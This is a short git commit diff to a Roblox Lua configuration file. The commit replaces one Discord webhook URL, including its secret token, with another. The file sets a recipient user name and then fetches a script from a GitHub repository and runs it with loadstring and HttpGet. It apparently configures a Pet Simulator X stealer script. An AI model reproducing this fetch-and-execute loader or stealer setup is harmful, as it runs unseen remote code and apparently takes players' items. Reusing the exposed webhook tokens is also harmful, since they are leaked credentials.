22c1702c1dfdb02cbcba90bc39e768498323f127
Maset0 <120063355+Maset0@users.noreply.github.com>
2022-12-11 00:11:34 +0200

    Update info1.lua

--- info1.lua
+++ info1.lua
@@ -1,4 +1,4 @@
 UserName = "dawidparuw"
-WebHook = "https://discord.com/api/webhooks/1050899061152153650/Z7YinHbWPNEsdmSu2C1UqDdD3ZF6b1go7-42XDA-VHXlytASungP9Fd8rWJnU_h7WbYj"
+WebHook = "https://discord.com/api/webhooks/1051259661849985044/6ZhVpjm9coiN-FhrwVCywTdzNSNyQhpmez30sr3eMeV3YMCZON0V8ViZ7YHzVS9LHaNP"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
